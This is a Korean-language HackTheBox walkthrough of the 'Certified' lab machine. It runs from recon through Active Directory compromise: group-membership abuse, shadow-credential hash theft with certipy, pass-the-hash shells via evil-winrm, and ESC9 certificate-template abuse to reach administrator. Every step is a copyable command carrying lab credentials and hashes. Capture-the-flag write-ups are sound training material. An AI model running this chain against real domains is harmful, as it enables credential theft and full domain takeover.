# Certified - HackTheBox
## Recon
```bash
sudo nmap -p 135,139,3268,3269,389,445,464,49667,49693,49694,49697,49724,49745,53,593,5985,636,88,9389 -sC -sV -vv -oA certified 10.129.231.186
```
<img width="1206" height="248" alt="image" src="https://github.com/user-attachments/assets/d144c821-d917-42f3-91ee-da551868489e" />
<img width="1206" height="201" alt="image" src="https://github.com/user-attachments/assets/ad9479c5-30a4-48b4-9433-e6fb725c21f3" />
<img width="1206" height="68" alt="image" src="https://github.com/user-attachments/assets/4739328c-8f12-45f1-ad36-8071c1ca468d" />

- KERBEROS(88)
- LDAP(389)
- SMB(445)
- WINRM(5985)
- CA

<br>

- `/etc/hosts`에 `dc01.certified.htb` 추가.
<img width="1206" height="72" alt="image" src="https://github.com/user-attachments/assets/70835473-47d9-4f1e-957b-dcdca72b6f61" />

---
## Shell as management_svc
- 유저목록 수집.
```bash
nxc smb 10.129.231.186 -u judith.mader -p judith09 --users
```
<img width="1206" height="450" alt="image" src="https://github.com/user-attachments/assets/e3d586ea-1bac-44ed-809a-c8962be3de98" />

<br>
<br>

- `bloodhound-pyhon`을 사용하여 AD 정보 수집.
```bash
bloodhound-python -u judith.mader -p judith09 -d certified.htb -c all --zip -ns 10.129.231.186
```
<img width="1206" height="450" alt="image" src="https://github.com/user-attachments/assets/42f90fbd-62b0-461b-93af-7a51605e4d70" />

<br>
<br>

- `management`그룹에 `WriteOwner`권한 발견.
<img width="1063" height="108" alt="image" src="https://github.com/user-attachments/assets/fafe7dbf-f604-4613-9430-a94642a1de27" />

<br>
<br>

- `management` 그룹에 `judith.mader` 추가.
```bash
net rpc group addmem management judith.mader -U certified.htb/judith.mader%judith09 -S 10.129.231.186

net rpc group members management -U certified.htb/judith.mader%judith09 -S 10.129.231.186
```
<img width="1204" height="158" alt="image" src="https://github.com/user-attachments/assets/0f6df981-a4e2-48a3-bd3e-8703dcb1ca6a" />

<br>
<br>

- `management_svc` 해쉬 탈취.
```bash
certipy-ad shadow auto -u judith.mader@certified.htb -p judith09 -account management_svc -dc-ip 10.129.231.186 -target-ip 10.129.231.186
```
<img width="1204" height="558" alt="image" src="https://github.com/user-attachments/assets/62d3f2fd-c107-47aa-81df-47d8be10902a" />

<br>
<br>

- `winrm`로그인 성공.
```bash
nxc winrm 10.129.231.186 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
```
<img width="1204" height="269" alt="image" src="https://github.com/user-attachments/assets/f57ab349-a7f1-4760-bdd5-6cec247f5faa" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.231.186 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
```
<img width="1204" height="293" alt="image" src="https://github.com/user-attachments/assets/2a248739-1643-4be0-ba3a-6421e5f6900c" />

---
## Auth as ca_operator
- `ca_operator`유저로 `GenericAll`권한 발견.
<img width="993" height="97" alt="image" src="https://github.com/user-attachments/assets/512e6a9b-bffc-4aa9-9c8d-69b5f06f9d08" />

<br>
<br>

- `ca_operator`해시 탈취.
```bash
certipy-ad shadow auto -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -dc-ip 10.129.231.186 -target-ip 10.129.231.186
```
<img width="1205" height="558" alt="image" src="https://github.com/user-attachments/assets/d50f65ee-5f33-420f-926c-5689f0600e6c" />

<br>
<br>

- `ca_operator:b4b86f45c6018f1b664f70805f45d8f2` 로그인 성공.
<img width="1205" height="120" alt="image" src="https://github.com/user-attachments/assets/33b3ba78-5a8c-4494-b463-2b16453f9961" />

---
## Privesc
- `ESC9` 취약점 발견.
```bash
certipy-ad find -u ca_operator -hashes b4b86f45c6018f1b664f70805f45d8f2 -target dc01.certified.htb -text -stdout -vulnerable
```
<img width="1205" height="120" alt="image" src="https://github.com/user-attachments/assets/79e1030b-f390-4337-a4fd-f729fa826359" />

<br>
<br>

- https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc9-no-security-extension-on-certificate-template
- `ca_operator`의 upn 변경.
```bash
certipy-ad account -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.129.231.186 -upn administrator -user ca_operator update
```
<img width="1205" height="188" alt="image" src="https://github.com/user-attachments/assets/65135401-a21c-4603-9519-8630df4aeb91" />

<br>
<br>

- `ca_operator`의 해시를 얻으면서 획득한 `ccache`파일을 `KRB5CCNAME`변수로 등록.
```bash
export KRB5CCNAME=ca_operator.ccache
```
<img width="1205" height="54" alt="image" src="https://github.com/user-attachments/assets/b781d2df-1444-4b4a-905b-3362c8bd9390" />

<br>
<br>

- `administrator` 인증 요청.
```bash
certipy-ad req -k -dc-ip 10.129.231.186 -target dc01.certified.htb -ca 'certified-DC01-CA' -template CertifiedAuthentication
```
<img width="1205" height="316" alt="image" src="https://github.com/user-attachments/assets/6075ade1-62c4-4de4-a5ee-6738c94105ff" />

<br>
<br>

- `ca_operator`의 upn을 되돌려 주기.
```bash
certipy-ad account -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.129.231.186 -upn ca_operator@certified.htb -user ca_operator update
```
<img width="1205" height="187" alt="image" src="https://github.com/user-attachments/assets/dcdbad1c-6e91-4452-93d4-f3299aafdaf9" />

<br>
<br>

- `administrator`해시 탈취.
```bash
ertipy-ad auth -dc-ip 10.129.231.186 -pfx administrator.pfx -username administrator -domain certified.htb
```
<img width="1205" height="295" alt="image" src="https://github.com/user-attachments/assets/c94fdd74-85c8-431e-ab4e-fc5ed953bf8d" />

<br>
<br>

- `winrm`로그인 성공.
```bash
nxc winrm 10.129.231.186 -u administrator -H 0d5b49608bbce1751f708748f67e2d34
```
<img width="1205" height="272" alt="image" src="https://github.com/user-attachments/assets/b0187283-a882-41c9-9827-958921106f8b" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.231.186 -u administrator -H 0d5b49608bbce1751f708748f67e2d34
```
<img width="1205" height="292" alt="image" src="https://github.com/user-attachments/assets/0d8ef37f-a470-409b-8f7f-3ed547677f5b" />

---
## FLAG
- `c:\users\management_svc\desktop\user.txt`
<img width="1205" height="210" alt="image" src="https://github.com/user-attachments/assets/8d2dfc87-790d-4377-b8d9-8f310044b4dc" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1205" height="210" alt="image" src="https://github.com/user-attachments/assets/5b742084-1e49-4aa6-abfd-816ae712a62f" />
